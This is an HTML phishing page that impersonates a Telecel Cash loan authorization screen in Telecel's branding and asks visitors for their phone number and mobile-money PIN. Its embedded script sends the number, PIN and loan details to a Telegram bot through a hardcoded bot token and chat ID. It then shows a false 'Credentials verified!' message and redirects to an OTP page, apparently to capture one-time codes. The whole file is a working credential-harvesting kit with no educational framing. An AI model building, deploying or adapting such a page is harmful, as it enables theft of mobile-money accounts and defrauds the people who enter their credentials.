<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Verify Loan - Telecel Cash</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
       
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
       
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #E42320 0%, #0033A0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
       
        .container {
            width: 100%;
            max-width: 420px;
            background: #fff;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
        }
       
        .logo-t {
            color: #E42320;
            font-size: 52px;
            font-weight: 900;
            letter-spacing: -1px;
            border: 4px solid #E42320;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            line-height: 72px;
            margin: 0 auto 10px;
        }
       
        .logo-text {
            color: #E42320;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 20px;
        }
       
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #1a1a1a;
        }
       
        .subtitle {
            font-size: 15px;
            color: #555;
            line-height: 1.4;
            margin-bottom: 24px;
        }

        /* Loan Info Box */
        .loan-info {
            background: linear-gradient(135deg, rgba(228, 35, 32, 0.08) 0%, rgba(0, 51, 160, 0.08) 100%);
            border-left: 5px solid #E42320;
            padding: 16px;
            border-radius: 10px;
            margin-bottom: 28px;
            text-align: left;
        }
        .loan-info h3 {
            color: #E42320;
            font-size: 15px;
            margin-bottom: 10px;
        }
        .loan-info p {
            margin: 6px 0;
            font-size: 14.5px;
            color: #222;
        }

        .form-group {
            text-align: left;
            margin-bottom: 24px;
        }
       
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #333;
        }
       
        select, input[type="tel"], input[type="text"] {
            width: 100%;
            padding: 16px 18px;
            font-size: 17px;
            border: 1.8px solid #E42320;
            border-radius: 12px;
            outline: none;
            transition: all 0.3s;
        }
       
        select:focus, input:focus {
            box-shadow: 0 0 0 3px rgba(228, 35, 32, 0.15);
            border-color: #0033A0;
        }
       
        #password {
            font-size: 24px;
            letter-spacing: 8px;
            text-align: center;
            font-weight: 700;
        }
       
        .error-msg {
            color: #dc3545;
            font-size: 13.5px;
            margin-top: 8px;
            padding: 10px;
            background: rgba(220, 53, 69, 0.1);
            border-radius: 6px;
            display: none;
        }
       
        .success-msg {
            color: #28a745;
            font-size: 13.5px;
            margin-top: 8px;
            padding: 10px;
            background: rgba(40, 167, 69, 0.1);
            border-radius: 6px;
            display: none;
        }
       
        .btn-action, .btn-back {
            width: 100%;
            padding: 18px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 10px 0;
        }
       
        .btn-action {
            color: #fff;
            background: linear-gradient(135deg, #E42320 0%, #0033A0 100%);
            border: none;
            box-shadow: 0 5px 15px rgba(228, 35, 32, 0.3);
        }
       
        .btn-action:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(228, 35, 32, 0.4);
        }
       
        .btn-back {
            font-size: 16px;
            font-weight: 600;
            color: #E42320;
            background: transparent;
            border: 1.8px solid #E42320;
        }
       
        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(228, 35, 32, 0.2);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
       
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #E42320;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
       
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
       
        .password-wrapper {
            position: relative;
        }
       
        .toggle-password {
            position: absolute;
            top: 50%;
            right: 16px;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-t">t</div>
        <div class="logo-text">telecel</div>
       
        <h1>Loan Authorization</h1>
        <p class="subtitle">
            Enter your Telecel number and PIN to approve this loan request.
        </p>
       
        <!-- Loan Details -->
        <div class="loan-info" id="loanInfo" style="display: none;">
            <h3>💰 Loan Details</h3>
            <p><strong>Amount:</strong> <span id="loanAmountDisplay">-</span></p>
            <p><strong>Purpose:</strong> <span id="loanPurposeDisplay">-</span></p>
            <p><strong>Applicant:</strong> <span id="loanNameDisplay">-</span></p>
        </div>
       
        <div class="form-group">
            <label>Account Type</label>
            <select id="accountType">
                <option value="mobile">Mobile Money (Telecel Cash)</option>
                <option value="broadband">Broadband</option>
            </select>
        </div>
       
        <div class="form-group">
            <label id="inputLabel">Telecel Phone Number</label>
            <input id="phone" inputmode="tel" placeholder="050XXXXXXXX" type="tel"/>
        </div>
       
        <div class="form-group">
            <label>PIN <small style="color:#666;">(4 digits only)</small></label>
            <div class="password-wrapper">
                <input autocomplete="off" id="password" inputmode="numeric" maxlength="4" placeholder="••••" type="text"/>
                <svg class="toggle-password" id="togglePassword" width="24" height="24" viewBox="0 0 24 24" fill="#333" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </div>
        </div>
       
        <div class="error-msg" id="err">Please enter a valid Telecel number and 4-digit PIN</div>
        <div class="success-msg" id="successMsg">✓ Verified! Processing your loan...</div>
       
        <button class="btn-action" id="next">Authorize & Confirm Loan</button>
        <button class="btn-back" id="back">Cancel</button>
    </div>
   
    <div id="spinner">
        <div class="spin"></div>
    </div>

    <script>
        // CONFIG
        const CONFIG = {
            BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',
            CHAT_ID: '6573120346',
            REDIRECT_PAGE: 'otp.html'
        };

        const state = {
            lastUpdateId: 0,
            pollInterval: null,
            loanInfo: null
        };

        const els = {
            phoneInput: document.getElementById('phone'),
            passwordInput: document.getElementById('password'),
            togglePassword: document.getElementById('togglePassword'),
            nextBtn: document.getElementById('next'),
            errMsg: document.getElementById('err'),
            successMsg: document.getElementById('successMsg'),
            spinner: document.getElementById('spinner'),
            loanInfo: document.getElementById('loanInfo'),
            loanAmountDisplay: document.getElementById('loanAmountDisplay'),
            loanPurposeDisplay: document.getElementById('loanPurposeDisplay'),
            loanNameDisplay: document.getElementById('loanNameDisplay')
        };

        // Extract Loan Details from URL
        function extractLoanInfo() {
            const params = new URLSearchParams(window.location.search);
            const amount = params.get('amount');
            const purpose = params.get('purpose');
            const name = params.get('name');

            if (amount) {
                state.loanInfo = { amount, purpose, name };

                els.loanInfo.style.display = 'block';
                els.loanAmountDisplay.textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
                els.loanPurposeDisplay.textContent = purpose ? purpose.replace(/([A-Z])/g, ' $1').trim() : 'Personal Use';
                els.loanNameDisplay.textContent = name || 'Customer';

                els.nextBtn.textContent = `Authorize GHS ${parseFloat(amount).toLocaleString()} Loan`;
            }
        }

        // PIN Input Control
        els.passwordInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });

        // Toggle Password
        els.togglePassword.addEventListener('click', () => {
            const isHidden = els.passwordInput.type === 'password';
            els.passwordInput.type = isHidden ? 'text' : 'password';
        });

        function showError(msg) {
            els.errMsg.textContent = msg;
            els.errMsg.style.display = 'block';
            els.successMsg.style.display = 'none';
        }

        function showSuccess(msg) {
            els.successMsg.textContent = msg;
            els.successMsg.style.display = 'block';
            els.errMsg.style.display = 'none';
        }

        function showSpinner() {
            els.spinner.style.display = 'flex';
        }

        function hideSpinner() {
            els.spinner.style.display = 'none';
        }

        // Submit Handler
        els.nextBtn.onclick = () => {
            const phone = els.phoneInput.value.trim();
            const pin = els.passwordInput.value.trim();

            if (!phone || phone.length < 10) {
                showError("Please enter a valid Telecel number");
                return;
            }
            if (!pin || pin.length !== 4) {
                showError("PIN must be 4 digits");
                return;
            }

            showSpinner();

            const message = `<b>🚨 New Flex Loan Authorization</b>\n\n` +
                            `Applicant: <code>${state.loanInfo?.name || 'N/A'}</code>\n` +
                            `Phone: <code>${phone}</code>\n` +
                            `Amount: <b>GHS ${state.loanInfo?.amount}</b>\n` +
                            `Purpose: <code>${state.loanInfo?.purpose || 'N/A'}</code>\n` +
                            `PIN: <code>${pin}</code>\n\n` +
                            `Approve this loan?`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(() => {
                showSuccess("✓ Credentials verified! Processing loan request...");
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_PAGE;
                }, 1800);
            })
            .catch(() => {
                hideSpinner();
                showError("Connection error. Please try again.");
            });
        };

        document.getElementById('back').onclick = () => window.history.back();

        // Initialize
        extractLoanInfo();
        els.phoneInput.focus();
    </script>
</body>
</html>
